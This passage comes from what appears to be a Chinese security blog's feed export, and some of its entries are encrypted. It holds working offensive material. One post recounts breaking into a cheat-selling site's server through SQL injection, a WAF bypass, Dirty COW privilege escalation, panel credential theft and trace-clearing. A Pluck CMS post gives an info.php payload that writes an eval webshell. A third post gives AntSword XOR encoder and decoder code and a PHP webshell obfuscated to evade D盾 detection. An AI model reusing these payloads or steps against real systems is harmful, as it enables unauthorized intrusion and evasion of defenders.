$_GET等常规特征动态函数的形式，可以用多种编码进行传输payload用cookie传payload，在一定程度上逃避WAF常见的POST跟GET型流量查杀这里就想到一个问题，在网络对♂抗的时候经常有人发出疑问：我的shell是免杀的，我的马也藏得很深，但是为什么我的shell总是能被对方找到？尽管你的shell是免杀的，也藏在了很深的目录，也有可能你的流量也是层层编码过的，但是常见的一句话连接工具不管是菜刀还是蚁剑还是冰蝎也好，都难逃一个特点就是POST传输。因为正常的业务中，大多数情况下都是只需GET请求，只有修改或者上传等操作的时候才需要POST。但是一旦你的shell连接上后，你在蚁剑中的每个操作，每个查询，都会对应一次甚至多次POST发包。就更别说你需要在靶机上继续进行信息搜集等操作了，点的越多，流量日志记录的就越多。日志中看到某一个文件短时间内被同一IP连着POST了几十次，用脚趾头想想就知道有问题。。。然而大多数人并不懂得如何正确擦屁股。所以在我看来，以后的方向可能就是GET请求+cookie或者http头传输payload。kali上著名的工具weevely也是采用了GET传payload的模式：Weevely命令传输分析但是命令行总是不方便，如果能够用拓展性强大的蚁剑能实现就好了。那么如何实现呢?这个等我学会了再给大家分享。。。。。。留下了不学无术的泪水.jpg]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bypass宝塔上传]]></title>
    <url>%2Fposts%2Fbt-bypass-upload%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! 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]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[向吃鸡外挂站开炮（三）]]></title>
    <url>%2Fposts%2Fhack-pubg-cheat-site-3%2F</url>
    <content type="text"><![CDATA[[向吃鸡外挂站开炮（一）](https://yzddmr6.tk/posts/hack-pubg-cheat-site-1/) [向吃鸡外挂站开炮（二）](https://yzddmr6.tk/posts/hack-pubg-cheat-site-2/)前言第三篇终于写好了，也算是比较有意思的一篇，遇到了很多坑，也用上了很多小技巧，写出来博君一笑。正文毫无套路的炫酷界面琳琅满目的商品列表这种卖黑号的通常都是跟各种hc商勾结在一起，用木马盗取用户账号，然后再出售账号让孤儿开挂。Getshellgetshell的过程懒得再复现一遍了，直接说思路吧。发现用的是一套已知的发卡系统，Fi9coder刚好在我星球里发过此发卡系统的漏洞合集。自己也审了一下，确实漏洞比较多。随便找一处submit.php里直接把$gid带入数据库查询，产生注入然后到后台logo处未过滤直接可以上传shell理论上很简单，但是实际上遇到了一些坑。第一个是对方似乎开了宝塔的防护，注入跟上传都会被拦截。我用的绕过办法是，注入用的参数污染，上传用的星球里嘉宾九世分享的bypass宝塔上传方法，换行绕过，一句话用的webshell-venom。第二个是找不到后台解决办法是找到他的一个旁站，然后谷歌找到了他旁站的后台。国外服务器，旁站都是这种乱七八糟的非法站，用的都是同一套有漏洞的系统。猜想可能都是这个后台，果然如此比较有意思，后台地址是 /sima ，看来站长也知道自己是个什么东西。拿着注入出来的账号密码就进去了Bypass disable function确实是getshell了，但是连接的时候出了问题，蚁剑连接的时候一直转圈圈发现是流量被检测后直接封ip了。因为用的webshell-venom生成的马，兼容流量编码，所以开始解决办法是传一个id参数，然后用蚁剑的base64-bypass编码器，把所有的payload都base64一遍。结果后面发现连接了一会儿又被封了。。。。再换上用自己写的蚁剑参数污染模块，总算是不被封了。。。宝塔默认会禁用系统函数，需要Bypass disable function用蚁剑自带的bypass插件发现因为宝塔的原因，会直接拦截上传的php解决办法是代理到burp后把payload抠出来，手动上传。(我也不知道为什么自动上传不行手动就可以了。。。)成功执行命令曲折的提权发现是2015的内核后笑开了花，脏牛一把梭走起。首先弹个msf回来，这样就可以有交互式shell但是发现firefart的exp会直接把系统搞崩。。。服务器直接挂了本来以为是偶然情况，等到第二天服务器又恢复了又提了一次结果还是宕机。。。所以又等了一天。。。冷静分析一下，首先脏牛是肯定可以打的，因为内核版本确实在脏牛攻击范围内，并且firefart的exp确实有回显。因为firefart是直接给你一个加了一个用户，并不会主动返回root权限的shell，需要你su切换或者去登录，猜想可能在覆盖的过程中造成了内核crash就宕机了。猜想是否可以用直接返回root shell的exp来解决。explit-db找到了这一个 https://www.exploit-db.com/exploits/40847编译一下，加个-s参数保存/etc/passwd文件看到了久违的root拿下宝塔先把他的passwd给恢复回去，不然一会儿机器又崩了就打不开了找到存有宝塔密码的数据库1/www/server/panel/data/default.db同目录admin_path.pl下找到面板路径扔到somd5里解密成功进入面板其实进面板的时候怕他绑了微信有提醒，结果没有，哈哈发现管理员登录IP查一下地址是福建的拿到数据库root密码(虽然没啥用)到此已经拿下服务器所有权限，清除痕迹擦屁股走人。最后有些图是后来补的，如果觉得有说的不对的地方欢迎跟我交流。法律红线切不可碰，证据全部打包，提交给网警同志。最后，吐槽一句吃鸡外挂越来越多了，越来越没游戏体验了。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蚁剑编码器之流量混淆]]></title>
    <url>%2Fposts%2Fant-mass-bypass%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pluck CMS后台另两处任意代码执行]]></title>
    <url>%2Fposts%2Fpluck-cms-getshell%2F</url>
    <content type="text"><![CDATA[前言本来是在cnvd上看到了有人发Pluck CMS的洞，但是没有公开细节，便想着自己挖一下。但是审完第一个后发现已经有两位同学写出来了Pluck CMS 4.7.10远程代码执行漏洞分析Pluck CMS 4.7.10 后台 文件包含+文件上传导致getshell代码分析当时自己的思路跟第一个同学一样，第二个同学的思路自己确实没有想到，佩服佩服。但是心有不甘，自己就继续挖掘了一下，又发现了两处可以任意命令执行的地方。正文第一处：过滤不严导致单引号逃逸这个跟第一篇思路一样，只不过找到了另一处未过滤的点在function.php里面blog_save_post()函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546function blog_save_post($title, $category, $content, $current_seoname = null, $force_time = null) &#123; //Check if &apos;posts&apos; directory exists, if not; create it. if (!is_dir(BLOG_POSTS_DIR)) &#123; mkdir(BLOG_POSTS_DIR); chmod(BLOG_POSTS_DIR, 0777); &#125; //Create seo-filename $seoname = seo_url($title); //Sanitize variables. $title = sanitize($title, true); $content = sanitizePageContent($content, false); if (!empty($current_seoname)) &#123; $current_filename = blog_get_post_filename($current_seoname); $parts = explode(&apos;.&apos;, $current_filename); $number = $parts[0]; //Get the post time. include BLOG_POSTS_DIR.&apos;/&apos;.$current_filename; if ($seoname != $current_seoname) &#123; unlink(BLOG_POSTS_DIR.&apos;/&apos;.$current_filename); if (is_dir(BLOG_POSTS_DIR.&apos;/&apos;.$current_seoname)) rename(BLOG_POSTS_DIR.&apos;/&apos;.$current_seoname, BLOG_POSTS_DIR.&apos;/&apos;.$seoname); &#125; &#125; else &#123; $files = read_dir_contents(BLOG_POSTS_DIR, &apos;files&apos;); //Find the number. if ($files) &#123; $number = count($files); $number++; &#125; else $number = 1; if (empty($force_time)) $post_time = time(); else $post_time = $force_time; &#125; //Save information. $data[&apos;post_title&apos;] = $title; $data[&apos;post_category&apos;] = $category; $data[&apos;post_content&apos;] = $content; $data[&apos;post_time&apos;] = $post_time; save_file(BLOG_POSTS_DIR.&apos;/&apos;.$number.&apos;.&apos;.$seoname.&apos;.php&apos;, $data); //Return seoname under which post has been saved (to allow for redirect). return $seoname;&#125;其中1234$data[&apos;post_title&apos;] = $title; $data[&apos;post_category&apos;] = $category; $data[&apos;post_content&apos;] = $content; $data[&apos;post_time&apos;] = $post_time;$title content åè¢«è¿æ»¤ï¼post_time不可控，$category可控所以只要把$cont2变成我们的payload即可第二处：安装模版+文件包含导致任意命令执行很多CMS都会在安装模版的时候getshell，那么这里笔者也发现了类似的漏洞。直接访问失败首先准备一个shell.php里面是我们的phpinfo();然后打包成shell.zip，直接上传主题发现确实上传并且解压成功但是由于目录下有.htaccess文件，直接把php设置为不可解析，所以无法直接访问文件包含突破所以就想到需要找一个位置对其进行包含，来达到执行的目的。首先看到admin.php中关于theme的部分跟进 data/inc/theme.php，发现调用了get_themes()方法跟进 functions.all.php，查看get_themes()方法123456789101112131415161718function get_themes() &#123; $dirs = read_dir_contents(&apos;data/themes&apos;, &apos;dirs&apos;); if ($dirs) &#123; natcasesort($dirs); foreach ($dirs as $dir) &#123; if (file_exists(&apos;data/themes/&apos;.$dir.&apos;/info.php&apos;)) &#123; include_once (&apos;data/themes/&apos;.$dir.&apos;/info.php&apos;); $themes[] = array( &apos;title&apos; =&gt; $themename, &apos;dir&apos; =&gt; $dir ); &#125; &#125; return $themes; &#125; else return false;&#125;发现会遍历data/themes/下所有主题目录，并且包含他的info.php文件此时info.php可控，就导致了任意代码执行。利用方法首先准备一个info.php123&lt;?phpfile_put_contents(&apos;x.php&apos;,base64_decode(&apos;PD9waHAgQGV2YWwoJF9HRVRbJ21yNiddKTs/Pg==&apos;));?&gt;然后打包压缩成shell.zip上传安装主题，然后点击回到主题页，此时触发文件包含。然后根目录下就会生成我们的一句话x.php，密码是mr6最后本人水平有限，文笔较差，如果有什么写的不对的地方还希望大家能够不吝赐教]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蚁剑实现动态秘钥编码器解码器]]></title>
    <url>%2Fposts%2Fantsword-xor-encoder%2F</url>
    <content type="text"><![CDATA[前言最近研究了一下蚁剑PHP的RSA和AES编码器，发现都是需要开启openssl扩展才可以使用但是这个模块大多数情况下是不开的，所以就导致蚁剑的强加密类型的编码器、解码器无法使用于是借鉴了一下冰蝎的思路，实现了一个动态秘钥的编码器解码器。冰蝎的解决方案我记得冰蝎在1.0版本有同样的问题，模块不开shell就用不了，但是2.0就解决了这个问题。那么冰蝎是怎么解决的呢。看一下他的shell.php是怎么写的123456789101112131415161718192021222324252627282930313233&lt;?php@error_reporting(0);session_start();if (isset($_GET[&apos;pass&apos;]))&#123; $key=substr(md5(uniqid(rand())),16); $_SESSION[&apos;k&apos;]=$key; print $key;&#125;else&#123; $key=$_SESSION[&apos;k&apos;]; $post=file_get_contents(&quot;php://input&quot;); if(!extension_loaded(&apos;openssl&apos;)) &#123; $t=&quot;base64_&quot;.&quot;decode&quot;; $post=$t($post.&quot;&quot;); for($i=0;$i&lt;strlen($post);$i++) &#123; $post[$i] = $post[$i]^$key[$i+1&amp;15]; &#125; &#125; else &#123; $post=openssl_decrypt($post, &quot;AES128&quot;, $key); &#125; $arr=explode(&apos;|&apos;,$post); $func=$arr[0]; $params=$arr[1]; class C&#123;public function __construct($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @new C($params);&#125;?&gt;注意看这一段12345678910if(!extension_loaded(&apos;openssl&apos;)) &#123; $t=&quot;base64_&quot;.&quot;decode&quot;; $post=$t($post.&quot;&quot;); for($i=0;$i&lt;strlen($post);$i++) &#123; $post[$i] = $post[$i]^$key[$i+1&amp;15]; &#125; &#125; else xxxxxx如果没有openssl扩展，那么就把postçåå®¹è·éæºç§é¥key异或一遍相当于自己写了个加密函数。那么当然蚁剑也可以利用此思路来解决此问题。如何生成随机秘钥冰蝎的做法是先请求两次shell(因为第二次请求的时候才会将秘钥保存到session中)如果请求中有pass=xxx就返回一个十六位的随机秘钥然后客户端跟服务端分别记下这个秘钥，用于后面流量的加密解密。但是也带来一个问题，握手获得秘钥的过程已经成为了很多WAF检测的特征。冰蝎动态二进制加密WebShell特征分析如何规避特征当然我们可以用PHPSESSID来作为秘钥，蚁剑的AES编码器也是这么做的。但是因为蚁剑的机制里面没有自动获取cookie这一个操作所以需要你人工浏览网站-&gt;获取cookie-&gt;填入配置文件才可以使用，但是太过麻烦。那么我们能否设置一个不需要握手，并且很容易就可以获得的随机秘钥呢于是想到可以我们可以用时间时间格式的选择时间也有很多种格式，选择哪一种呢？想到如果时间中带有秒的话，很容易发个包过去就错过同一时间了，无法完成加解密。所以我们可以采用年-月-日 时-分的时间格式，然后md5一次，来作为我们的随机秘钥。思路与实现蚁剑获取时间-&gt;生成随机秘钥-&gt;加密payload-&gt;发送给shellshell获取时间-&gt;生成随机秘钥-&gt;解密payload-&gt;将回显data编码-&gt;返回给蚁剑蚁剑获取时间-&gt;生成随机秘钥-&gt;解密返回data-&gt;获取信息要注意的是因为基于时间产生秘钥，所以要保证你的时区是跟shell的时区是一致的。因为我本地蚁剑是北京时间，所以在shell中也强制设置为北京时间。动态秘钥编码器不得不说一个坑同样一句console.log(new Date().toLocaleString());在node中是24小时制在浏览器跟蚁剑中是12小时制被坑了好久没发现。。。干脆重新确定一个24小时制的规范时间格式，也方便后期自定义修改123456789101112131415161718192021222324252627Object.assign(Date.prototype, &#123; switch (time) &#123; let date = &#123; &quot;yy&quot;: this.getFullYear(), &quot;MM&quot;: this.getMonth() + 1, &quot;dd&quot;: this.getDate(), &quot;hh&quot;: this.getHours(), &quot;mm&quot;: this.getMinutes(), &quot;ss&quot;: this.getSeconds() &#125;; if (/(y+)/i.test(time)) &#123; time = time.replace(RegExp.$1, (this.getFullYear() + &apos;&apos;).substr(4 - RegExp.$1.length)); &#125; Object.keys(date).forEach(function (i) &#123; if (new RegExp(&quot;(&quot; + i + &quot;)&quot;).test(time)) &#123; if (RegExp.$1.length == 2) &#123; date[i] &lt; 10 ? date[i] = &apos;0&apos; + date[i] : date[i]; &#125; time = time.replace(RegExp.$1, date[i]); &#125; &#125;) return time; &#125; &#125;) let newDate = new Date(); let time = newDate.switch(&apos;yyyy-MM-dd hh:mm&apos;);所以demo是这样的12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&apos;use strict&apos;;// code by yzddmr6/** @param &#123;String&#125; pwd 连接密码* @param &#123;Array&#125; data 编码器处理前的 payload 数组* @return &#123;Array&#125; data 编码器处理后的 payload 数组*/module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123; function xor(payload)&#123; let crypto = require(&apos;crypto&apos;); Object.assign(Date.prototype, &#123; switch (time) &#123; let date = &#123; &quot;yy&quot;: this.getFullYear(), &quot;MM&quot;: this.getMonth() + 1, &quot;dd&quot;: this.getDate(), &quot;hh&quot;: this.getHours(), &quot;mm&quot;: this.getMinutes(), &quot;ss&quot;: this.getSeconds() &#125;; if (/(y+)/i.test(time)) &#123; time = time.replace(RegExp.$1, (this.getFullYear() + &apos;&apos;).substr(4 - RegExp.$1.length)); &#125; Object.keys(date).forEach(function (i) &#123; if (new RegExp(&quot;(&quot; + i + &quot;)&quot;).test(time)) &#123; if (RegExp.$1.length == 2) &#123; date[i] &lt; 10 ? date[i] = &apos;0&apos; + date[i] : date[i]; &#125; time = time.replace(RegExp.$1, date[i]); &#125; &#125;) return time; &#125; &#125;) let newDate = new Date(); let time = newDate.switch(&apos;yyyy-MM-dd hh:mm&apos;); let key = crypto.createHash(&apos;md5&apos;).update(time).digest(&apos;hex&apos;) key=key.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0)); //let payload=&quot;phpinfo();&quot;; let cipher = payload.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0)); for(let i=0;i&lt;cipher.length;i++)&#123; cipher[i]=cipher[i]^key[i%32] &#125; cipher=cipher.map(t=&gt;String.fromCharCode(t)).join(&quot;&quot;) cipher=Buffer.from(cipher).toString(&apos;base64&apos;); //console.log(cipher) return cipher; &#125; data[&apos;_&apos;] = Buffer.from(data[&apos;_&apos;]).toString(&apos;base64&apos;); data[pwd] = `eval(base64_decode(&quot;$&#123;data[&apos;_&apos;]&#125;&quot;));`; data[pwd]=xor(data[pwd]); delete data[&apos;_&apos;]; return data;&#125;动态秘钥解码器1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&apos;use strict&apos;;//code by yzddmr6module.exports = &#123; /** * @returns &#123;string&#125; asenc 将返回数据base64编码 * 自定义输出函数名称必须为 asenc * 该函数使用的语法需要和shell保持一致 */ asoutput: () =&gt; &#123; return `function asenc($out)&#123; date_default_timezone_set(&quot;PRC&quot;); $key=md5(date(&quot;Y-m-d H:i&quot;,time())); for($i=0;$i&lt;strlen($out);$i++)&#123; $out[$i] = $out[$i] ^ $key[$i%32]; &#125; return @base64_encode($out); &#125; `.replace(/\n\s+/g, &apos;&apos;); &#125;, /** * 解码 Buffer * @param &#123;string&#125; data 要被解码的 Buffer * @returns &#123;string&#125; 解码后的 Buffer */ decode_buff: (data, ext=&#123;&#125;) =&gt; &#123; function xor(payload)&#123; let crypto = require(&apos;crypto&apos;); Object.assign(Date.prototype, &#123; switch (time) &#123; let date = &#123; &quot;yy&quot;: this.getFullYear(), &quot;MM&quot;: this.getMonth() + 1, &quot;dd&quot;: this.getDate(), &quot;hh&quot;: this.getHours(), &quot;mm&quot;: this.getMinutes(), &quot;ss&quot;: this.getSeconds() &#125;; if (/(y+)/i.test(time)) &#123; time = time.replace(RegExp.$1, (this.getFullYear() + &apos;&apos;).substr(4 - RegExp.$1.length)); &#125; Object.keys(date).forEach(function (i) &#123; if (new RegExp(&quot;(&quot; + i + &quot;)&quot;).test(time)) &#123; if (RegExp.$1.length == 2) &#123; date[i] &lt; 10 ? date[i] = &apos;0&apos; + date[i] : date[i]; &#125; time = time.replace(RegExp.$1, date[i]); &#125; &#125;) return time; &#125; &#125;) let newDate = new Date(); let time = newDate.switch(&apos;yyyy-MM-dd hh:mm&apos;); let key = crypto.createHash(&apos;md5&apos;).update(time).digest(&apos;hex&apos;) key = key.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0)); let data = payload; let cipher=Buffer.from(data.toString(), &apos;base64&apos;).toString(); cipher = cipher.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0)); for (let i = 0; i &lt; cipher.length; i++) &#123; cipher[i] = cipher[i] ^ key[i % 32] &#125; cipher=cipher.map(t=&gt;String.fromCharCode(t)).join(&quot;&quot;) return cipher; &#125; return xor(data); &#125;&#125;但是发现遇到中文会乱码，所以仅作为一个参考吧服务端原型123456789&lt;?phpdate_default_timezone_set(&quot;PRC&quot;);@$post=base64_decode($_REQUEST[&apos;yzddmr6&apos;]);$key=md5(date(&quot;Y-m-d H:i&quot;,time()));for($i=0;$i&lt;strlen($post);$i++)&#123; $post[$i] = $post[$i] ^ $key[$i%32];&#125;eval($post);?&gt;D盾4级，稍微处理一下让他免杀1234567891011121314&lt;?phpdate_default_timezone_set(&quot;PRC&quot;);$key=md5(date(&quot;Y-m-d H:i&quot;,time()));class TEST&#123; function encode($key)&#123; @$post=base64_decode($_REQUEST[&apos;test&apos;]); for($i=0;$i&lt;strlen($post);$i++)&#123;$post[$i] = $post[$i] ^ $key[$i%32];&#125; return $post;&#125; function ant($data) &#123;return eval($this-&gt;encode(&quot;$data&quot;));&#125;&#125;$test=new TEST;$test-&gt;ant($key);?&gt;测试在蚁剑中新建编码器 解码器，然后起一个你喜欢的名字，把上面的代码复制进去即可。配置一下就可以使用啦没错，我用的就是著名的backdoorstudy你可以同时使用动态秘钥编码器跟动态秘钥解码器，也可以只使用编码器，或者动态编码器跟其他解码器结合。要注意的是，因为一些玄学问题，当你使用了demo中的动态解码器后遇见中文会乱码。个人建议 动态秘钥编码器+base64解码器 就差不多了。最后在demo中用的是年-月-日 时-分的时间格式，可能过不了多久也会被检测。如果以后被加入豪华午餐的话，自己可以自由修改日期的格式，例如日-年-月 时-分，或者 日期+盐 来达到混淆的效果在编码器中已经留好了日期格式修改的接口，换一换顺序即可。通过以上操作我们已经实现了无需握手传递秘钥的编码器解码器到这里好像没什么问题了但是发现蚁剑默认的payload会把data[]数组中其他的参数只是base64一遍这样的流量还是容易被检测出，这也是蚁剑的硬伤。在这篇文章里WAF拦了蚁剑发送的其它参数时怎么操作蚁剑作者也给出了解决方案但是这样修改的话只是针对一个编码器，不能对所有的编码器有效最稳固的办法还是自己修改蚁剑硬编码的payload，来满足自己的需求。本文只是抛砖引玉，没什么技术含量，还望大佬们轻喷。参考文章https://mp.weixin.qq.com/s/uITAIt-jj3-CYKwXQqFzMwhttps://mp.weixin.qq.com/s/IUs3YbWKSAE2ptAw1nrJyghttps://mp.weixin.qq.com/s/ai3dW8H_ZnlFMPo-pgoqZwhttps://xz.aliyun.com/t/2774]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[知识星球]WebShell免杀之PHP]]></title>
    <url>%2Fposts%2Fwebshell-bypass-php%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! U2FsdGVkX1/M+r8RaxpBv41Htd8auBLNTMiK031zJ2PG6dokzDeUS16AaraHMb367on+SjwivaT45oIWsBvszKDF4A+n2Dfu2kkbfrmiz74DPWW4ufDVuvA5t5jKu3OVzRwJgxpmjvhS+cD7XUeczM6m/ZeHnwygHwg/kFXaMGH9bq3rFN4zCOvX/IEaxyl9Tdopau2qxQ0XrojtVnXQbsYByGVCi6bReir330vAcYTHnrk6lRNhwFLR0WDu77zGvM1QCWEq7AWRJwlC3OI6EuWDk0XCfC7HQ2Sy29gRX57vRELu79dgRs57CF+JfspKLaNssiZ10NzxlNKjAQMIEDYzStVuoLIbGuKUSfIbh+SsfFAmuaEJX3+8ufRNpBFlQqPwUw9kBevgqzT7q0Hxg6AqbE0cRNcnixco0MNAv9YuTPTxL8KPq2W15PPd2qQ0mmN3vJs3t0uF5x1sR12afvjhMiJb9ACrzzDmy4xTY1swuJFKvrv40iDdNLflIIH+mSeE2I/j20fWIM6rBfXaBhw43GBGE17wpbM+oHogAHZXe+e3L7NqbALmxF++hq05OAUCVUyVJNpikMiTwPycMh0B9MZYgsLIIGL/Jqxne3dvbhQQ75IbYnVWRzgSqrnnngceOtVHXrXaESvarlAdBV+YEkuvByhY24+Fbv7l6BT44of5lR5Z1Rw9yy9dAy0zHuUaKCTV8obT4usr56FZLedZlm6KzVUPFab2uEFR7mcdtIrUe/4GJMG1O6IjCEPwb2rIwM07EdpOf13MaBWNHJTzYIVA4K+/wEZj59lq7yDY9cnPOQl6fxL8Ocgj8iBAq0OL0wR4v8/XSpp4LWvN6g6kZ7CCCRrWsqmoXGqaxBn37nLFTMrdPMqFbW6/sLj92SDc4g65/mSdMpiAtSjGMvbwdsD7zZW9q/6kyBIjM0AxC1KEtXxBST4J5WhwdvUVQTkyJVVN4Zj5fbwU03aduLRZejLTBYqKyla6qJ8j0WH45JXzwVTnH05fPLrCgXGXdXnXdvJO+dbq7X58nS3UgCNuN0On0KlvJ05NrGsu9ciexWNtcyDtc5jDbxK2Fa0o0H2TkScpu+CnlsldpJEtTd1VNfzb0ZdsUQ6WBDh7Av